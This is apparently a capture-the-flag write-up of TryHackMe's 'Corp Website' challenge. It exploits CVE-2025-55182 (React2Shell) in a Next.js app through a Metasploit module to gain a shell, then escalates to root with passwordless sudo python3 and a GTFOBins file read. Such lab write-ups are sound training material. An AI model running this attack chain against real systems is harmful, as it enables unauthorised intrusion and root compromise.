---
title: "Corp Website"
date: 2026-02-17
categories:
  - THM
tags:
  - CTF
  - "2026"
platform: THM Love at First Breach 2026
competition_year: "2026"
toc: true
toc_sticky: true
---

# 🌐 Love at First Breach 2026 - Corp Website

|Category         |	Author                |
|-----------------|-----------------------|
| 🌐 Web         |TryHackMe      |

## Challenge Prompt
My Dearest Hacker,

Valentine's Day is fast approaching, and "Romance & Co" are gearing up for their busiest season.

Behind the scenes, however, things are going wrong. Security alerts suggest that "Romance & Co" has already been compromised. Logs are incomplete, developers defensive and Shareholders want answers now!

As a security analyst, your mission is to retrace the attacker's, uncover how the attackers exploited the vulnerabilities found on the "Romance & Co" web application and determine exactly how the breach occurred.

You can find the web application here: `http://MACHINE_IP:3000`


## Problem Type
- Web
- React2Shell
- CVE-2025-55182

## Solve
Upon visiting the page we see Romance & Co.<br>
I started this one with a quick nmap using `nmap -p 3000 -T4 -A <SITE IP>`
<img width="1360" height="743" alt="image" src="https://github.com/user-attachments/assets/e54109b0-a1b8-4d5e-9fa2-28536d28e4f7" />

I spent a lot of time playing with different things on the site, running FFUF, etc but I noticed this one is made with Next.js.
I decided to run nuclei with `nuclei -u http://<SITE IP>:3000` to see if there were any vulnerabilities:
<img width="1348" height="491" alt="image" src="https://github.com/user-attachments/assets/a485ff3d-f2dc-480e-a0a5-5b7139039108" />

Jackpot! CVE-2025-55182 is React2Shell a critical RCE vulnarability.
From there I moved into Metasploit with `msfconsole`.

Then I ran `search CVE-2025-55182` to see if there were any plug ins to exploit this and there were:
<img width="1337" height="684" alt="image" src="https://github.com/user-attachments/assets/75c0086d-87d6-4c9c-9366-1c7740f0113f" />

I ran `use 0` to use the exploit. Then `options` to see what I needed to set.
I ran `set RHOSTS SITE_IP`, `set RPORT 3000`, and `set LHOST MY_IP`. Then I ran `exploit` to kick off the attack.

I was able to get a shell as the user `daniel`:
<img width="913" height="159" alt="image" src="https://github.com/user-attachments/assets/cf4d8976-ac10-434a-9a26-c23e3c4861f4" />

Since we need the user flag, I ran `cd ~` to go to his home directory and then ran an `ls -la` and found the `user.txt` file. `cat` that file out and we get the first flag:<br>
<img width="586" height="153" alt="image" src="https://github.com/user-attachments/assets/3f5528b0-5039-4d18-b474-de013d7ba23b" />

Then I ran a `sudo -l` and saw the daniel user can run `python3` as root with no password:
<img width="683" height="169" alt="image" src="https://github.com/user-attachments/assets/73e81e8e-1b17-468e-b1b8-c891d774d004" />

I then used [GTFO bins Python File Read](https://gtfobins.org/gtfobins/python/#file-read) to see the flag at /root/root.txt:
<img width="529" height="49" alt="image" src="https://github.com/user-attachments/assets/134f88d2-617a-4ac2-8c5a-e817be85540e" />
